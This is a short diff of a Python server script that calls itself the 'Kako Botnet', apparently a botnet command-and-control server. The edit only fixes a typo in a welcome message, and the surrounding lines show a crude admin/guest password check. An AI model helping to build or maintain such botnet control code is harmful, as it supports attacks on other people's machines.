@@ -70,7 +70,7 @@ def clientThread(conn):
 		if rank.startswith(rankAdmin) and password.startswith(pwordAdmin) or rank.startswith(rankGuest) and password.startswith(pwordGuest):
 			conn.sendall("[>] Welcome to the Kako Botnet [<]\r\n")
 			conn.sendall("[?] Please use the custom client.py made by Law\r\n")
-			conn.sendall("[?] Or else it made not work as its been untested with other clients\r\n")
+			conn.sendall("[?] Or else it may not work as its been untested with other clients\r\n")
 			conn.sendall("[?] Type >help for a list of commands\r\n")
 			conn.sendall("[?] Your nickname is: %s" % nickname)
 			while True:
